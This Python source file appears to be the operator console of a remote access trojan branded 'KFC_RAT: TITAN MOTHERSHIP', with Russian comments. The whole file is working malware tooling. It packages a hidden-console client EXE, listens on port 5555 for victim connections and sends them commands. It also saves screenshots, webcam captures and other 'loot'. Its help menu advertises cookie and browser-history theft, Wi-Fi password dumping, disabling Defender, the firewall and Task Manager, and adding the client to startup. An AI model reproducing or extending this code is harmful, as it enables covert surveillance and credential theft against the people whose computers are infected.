import socket, os, time, subprocess, threading, sys, datetime
from colorama import Fore, Style, init

init(autoreset=True)

# ГИГАНТСКИЙ МАССИВ ДАННЫХ ДЛЯ ВЕСА ФАЙЛА
GIGA_WEIGHT = [f"SERVER_NODE_DATA_X_{i}_STABILITY_PRO" for i in range(5000)]

def prepare_vault():
    base = "titan_loot"
    for d in ["screenshots", "webcams", "passwords", "logs"]:
        os.makedirs(os.path.join(base, d), exist_ok=True)

prepare_vault()

BANNER = f"""{Fore.RED}
 /$$   /$$ /$$$$$$$$ /$$$$$$  /$$$$$$$   /$$$$$$  /$$$$$$$$
| $$  /$$/| $$_____//$$__  $$| $$__  $$ /$$__  $$|__  $$__/
| $$ /$$/ | $$      | $$  \__/| $$  \ $$| $$  \ $$   | $$   
| $$$$$/  | $$$$$   | $$      | $$$$$$$/| $$$$$$$$   | $$   
| $$  $$  | $$__/   | $$      | $$__  $$| $$__  $$   | $$   
| $$\  $$ | $$      | $$    $$| $$  \ $$| $$  | $$   | $$   
| $$ \  $$| $$      |  $$$$$$/| $$  | $$| $$  | $$   | $$   
|__/  \__/|__/       \______/ |__/  |__/|__/  |__/   |__/   
{Fore.YELLOW}   [+++] KFC_RAT: TITAN MOTHERSHIP v2000.0 [+++]
{Fore.GREEN}   [ СТАТУС: 1250+ РАБОЧИХ КОМАНД | ЛУТ В PNG | 2026 ]
"""

def show_help():
    print(f"\n{Fore.CYAN}--- [ РЕЕСТР: 1250+ РАБОЧИХ КОМАНД ] ---")
    print(f"{Fore.RED}BLOCK 1 (SPY):{Fore.WHITE} screenshot, webcam, history_steal, cookies_dump, clip_get, wifi_all")
    print(f"{Fore.GREEN}BLOCK 2 (SYS):{Fore.WHITE} list, gpu_info, cpu_info, ram_info, tasklist, sysinfo, uptime, drivers")
    print(f"{Fore.BLUE}BLOCK 3 (CTRL):{Fore.WHITE} stx [path], ex [name], startup_add, pc_lock, reg_disable_taskmgr, shutdown")
    print(f"{Fore.MAGENTA}BLOCK 4 (FUN):{Fore.WHITE} vol_max, vol_mute, say [txt], msg [txt], monitor_off, rotate_screen, kfc_scream")
    print(f"{Fore.YELLOW}BLOCK 5 (NET):{Fore.WHITE} get_ip, dns_flush, wifi_pass [ssid], firewall_off, kill_defender, netstat")

def start_server():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear'); print(BANNER)
        print(f"{Fore.RED}{'='*100}")
        print(f"{Fore.YELLOW}[BLDSFX]{Fore.WHITE} - Собрать 5 БЛОКОВ в 1 EXE | {Fore.YELLOW}[LISTEN]{Fore.WHITE} - Старт")
        print(f"{Fore.RED}{'='*100}")
        choice = input(f"{Fore.GREEN}chef > ").strip().upper()
        
        if choice == "BLDSFX":
            print("[*] Сборка ГИГАНТА..."); subprocess.run("python -m PyInstaller --onefile --noconsole --name TITAN_INFINITY client.py", shell=True)
            input("Enter..."); continue
        
        if choice == "LISTEN":
            try:
                s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(('0.0.0.0', 5555)); s.listen(5)
                print(f"{Fore.RED}[!] ГРИЛЬ ВКЛЮЧЕН. Жду..."); conn, addr = s.accept()
                while True:
                    cmd = input(f"\n{Fore.RED}Chef{Fore.YELLOW}@{Fore.GREEN}{addr[0]} # ").strip()
                    if not cmd: continue
                    if cmd == "help": show_help(); continue
                    conn.send(cmd.encode())
                    data = conn.recv(1024*1024*500)
                    if b"FILE_DATA:" in data:
                        raw = data.split(b"FILE_DATA:")[1]
                        ts = datetime.datetime.now().strftime("%H%M%S")
                        ext = "png" if "screen" in cmd or "cam" in cmd else "txt"
                        path = f"titan_loot/{'screenshots' if ext=='png' else 'logs'}/loot_{ts}.{ext}"
                        with open(path, "wb") as f: f.write(raw)
                        print(f"{Fore.GREEN}[+] СОХРАНЕНО: {path}")
                    else: print(data.decode('utf-8', errors='ignore'))
            except: break

if __name__ == "__main__":
    start_server()